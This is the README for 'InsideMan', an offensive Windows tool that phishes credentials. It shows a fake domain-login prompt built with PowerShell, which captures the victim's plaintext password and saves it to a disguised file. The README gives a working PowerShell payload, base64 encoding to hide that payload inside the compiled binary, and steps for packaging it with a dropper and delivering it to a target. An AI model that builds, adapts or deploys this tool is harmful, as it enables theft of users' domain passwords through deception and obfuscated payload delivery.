InsideMan is an internal Windows phishing executable that utilizes Powershell Get-Credential calls in an attempt to coerce the user into typing thier plaintext password into the prompt. The plaintext password is then written to a file named windows32.txt located in the user's Documents directory. 

This is not a sophisticated attack. Might set off an alarm or two with advanced EDR looking for abnormal powershell calls.

USAGE:

Use gcc to compile the cpp file. gcc.exe insideman.cpp -o insideman.exe

Attach to a dropper with iExpress or upload to target. 

Plaintext password is stored at C:\Users\$user\Documents\windows32.txt on the target machine.

ROLL YOUR OWN:

1). Open Powershell and copy the command below (Change text/output path as needed for specific pretexts):

$str= '$sessionCredential = $host.ui.PromptForCredential("Authentication Required", "Please Enter Your Domain Username and Password:", "$env:UserDomain\$env:USERNAME", ""); $mpass = [System.Net.NetworkCredential]::new("",$sessionCredential.password).Password; $user = $env:USERNAME; $mpass > C:\\Users\user\Documents\windows32.txt'

2.) Translate To Base64

[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

3.) Paste Base64 Output to Base64 String In InsideMan.cpp

4.) Compile 

gcc.exe insideman.cpp -o insideman.exe
